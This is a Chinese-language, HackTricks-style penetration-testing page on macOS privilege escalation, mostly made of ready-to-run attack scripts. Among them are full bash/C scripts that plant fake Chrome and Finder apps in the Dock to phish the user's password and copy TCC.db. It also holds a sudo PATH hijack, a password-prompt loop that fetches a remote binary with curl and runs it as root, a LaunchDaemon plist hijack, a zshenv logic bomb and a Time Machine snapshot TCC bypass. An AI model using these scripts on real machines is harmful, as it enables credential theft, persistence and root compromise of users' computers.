# macOS 权限提升

{{#include ../../banners/hacktricks-training.md}}

## TCC 权限提升

如果你来这里是为了查找 TCC 权限提升，请前往：


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

请注意，**大多数影响 Linux/Unix 的权限提升技巧也同样适用于 MacOS** 机器。因此请参阅：


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## 用户交互

### Sudo Hijacking

你可以在 Linux Privilege Escalation 文章中找到原始的 [Sudo Hijacking 技巧](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)。

但是，macOS 在用户执行 **`sudo`** 时会**保留**用户的 **`PATH`**。这意味着，实现此攻击的另一种方式是**劫持受害者在运行 sudo 时仍会执行的其他二进制文件**：
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
注意，使用 terminal 的用户极有可能已经**安装了 Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的二进制文件。

### Dock 伪装

通过一些**social engineering**，你可以在 Dock 中**伪装成例如 Google Chrome**，实际上执行自己的脚本：

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
一些建议：

- 检查 Dock 中是否有 Chrome；如果有，**移除**该条目，并将**假的** **Chrome 条目添加到 Dock 数组中的相同位置**。

<details>
<summary>Chrome Dock 伪装脚本</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
一些建议：

- 你**无法从 Dock 中移除 Finder**，因此如果要将其添加到 Dock，可以把 fake Finder 放在真实 Finder 的旁边。为此，你需要**将 fake Finder 条目添加到 Dock 数组的开头**。
- 另一种选择是不将其放入 Dock，而是直接打开它；“Finder 请求控制 Finder”并不奇怪。
- 另一种**无需询问密码即可提权到 root**、避免显示可疑对话框的方法，是让 Finder 真正请求密码来执行特权操作：
- 让 Finder 将一个新的 **`sudo`** 文件复制到 **`/etc/pam.d`**（密码提示会显示“Finder 想要复制 sudo”）
- 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，这样密码提示会显示“Finder 想要复制 Finder.bundle”）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### 密码提示钓鱼 + sudo 重用

恶意软件经常滥用用户交互来**窃取具备 sudo 权限的密码**，并以编程方式重复使用。常见流程：

1. 使用 `whoami` 确定已登录用户。
2. **循环显示密码提示**，直到 `dscl . -authonly "$user" "$pw"` 返回成功。
3. 缓存凭据（例如 `/tmp/.pass`），并使用 `sudo -S` 执行特权操作（密码通过标准输入传递）。

最小示例链：
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
窃取的密码随后可用于通过 `xattr -c` **清除 Gatekeeper quarantine**、复制 LaunchDaemons 或其他特权文件，并以非交互方式运行额外阶段。

## 较新的 macOS-specific vectors（2023–2025）

### Deprecated `AuthorizationExecuteWithPrivileges` 仍可用

`AuthorizationExecuteWithPrivileges` 已在 10.7 中 deprecated，但**在 Sonoma/Sequoia 上仍然有效**。许多商业更新程序会使用不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标 binary 可由用户写入，你可以植入 trojan 并利用合法的 prompt：
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
结合上面的 **masquerading tricks**，呈现一个可信的密码对话框。


### Privileged helper / XPC 分析

许多现代第三方 macOS privescs 都遵循相同模式：一个 **root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露 **Mach/XPC service**，然后该 helper 要么**不验证 client**，要么验证得**太晚**（PID race），或者暴露一个会处理**user-controlled path/script** 的 **root method**。这类 bug 导致了许多近期 VPN client、game launcher 和 updater 中的 helper bugs。

快速分析清单：
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
特别注意以下类型的 helper：

- 在 **uninstall** 后仍继续接受请求，因为该 job 仍加载在 `launchd` 中
- 从 **`/Applications/...`** 或其他可由非 root 用户写入的路径执行脚本或读取配置
- 依赖基于 **PID** 或仅基于 **bundle-id** 的 peer 验证，而这类验证可能存在 race condition

有关 helper authorization bugs 的更多详情，请查看[此页面](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)。

### PackageKit script environment inheritance (CVE-2024-27822)

在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复该问题之前，通过 **`Installer.app`** / **`PackageKit.framework`** 由用户发起的安装可能会在当前用户的 environment 中以 root 身份执行 **PKG scripts**。这意味着，使用 **`#!/bin/zsh`** 的 package 会加载攻击者的 **`~/.zshenv`**，并在受害者安装该 package 时以 root 身份运行其中的内容。

这作为 **logic bomb** 尤其值得关注：你只需要在用户账户中取得 foothold，并拥有一个可写的 shell startup file，然后等待用户执行任何存在漏洞的、基于 **zsh** 的 installer。通常这不适用于 **MDM/Munki** deployments，因为它们会在 root 用户的 environment 中运行。
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
如果你想深入了解特定于 installer 的滥用方式，也可以查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。

### LaunchDaemon plist hijack（CVE-2025-24085 pattern）

如果 LaunchDaemon plist 或其 `ProgramArguments` target **可由用户写入**，你可以通过替换它，然后强制 launchd reload 来实现权限提升：
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
这与 **CVE-2025-24085** 中发布的 exploit pattern 类似，当时攻击者滥用可写的 plist，以 root 身份执行代码。

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` 中的 **race** 允许本地攻击者通过在线程之间反复执行 `setgid()`/`getgid()` 循环，直到发生撕裂的 `memcpy`，从而破坏只读 credential pointer（`proc_ro.p_ucred`）。成功破坏后可获得 **uid 0** 和 kernel memory access。最小 PoC 结构：
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
与 heap grooming 结合，可将受控数据放置到指针重新读取的位置。在存在漏洞的构建版本上，这是可靠的 **local kernel privesc**，且不需要 bypass SIP。

### 通过 Migration assistant bypass SIP（"Migraine"，CVE-2023-32369）

即使已经获得 root，SIP 仍会阻止对系统位置的写入。**Migraine** 漏洞滥用 Migration Assistant entitlement `com.apple.rootless.install.heritable`，生成一个继承 SIP bypass 的子进程，并覆盖受保护路径（例如 `/System/Library/LaunchDaemons`）。攻击链如下：

1. 在运行中的系统上获得 root。
2. 使用构造的状态触发 `systemmigrationd`，使其运行攻击者控制的 binary。
3. 使用继承的 entitlement 修改受 SIP 保护的文件，即使重启后仍能保持持久化。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）

多个 Apple daemon 通过 XPC 接受 **NSPredicate** 对象，却只验证由攻击者控制的 `expressionType` 字段。通过构造一个可执行任意 selector 的 predicate，可以在 root/system XPC services 中实现 **code execution**（例如 `coreduetd`、`contextstored`）。与初始的 app sandbox escape 结合后，无需用户提示即可实现 **privilege escalation**。应查找会反序列化 predicate 且缺少健壮 visitor 的 XPC endpoints。

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**任何用户**（即使是非特权用户）都可以创建并挂载 Time Machine snapshot，从而**访问该 snapshot 中的所有文件**。\
唯一需要的 privileged 条件是所使用的 application（例如 `Terminal`）拥有 **Full Disk Access**（FDA）权限（`kTCCServiceSystemPolicyAllfiles`），且该权限需要由管理员授予。

<details>
<summary>挂载 Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

更详细的说明可以[**在原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

## 敏感信息

这对于提升权限可能很有用：


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## 参考资料

- [Microsoft “Migraine” SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822：macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165：AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
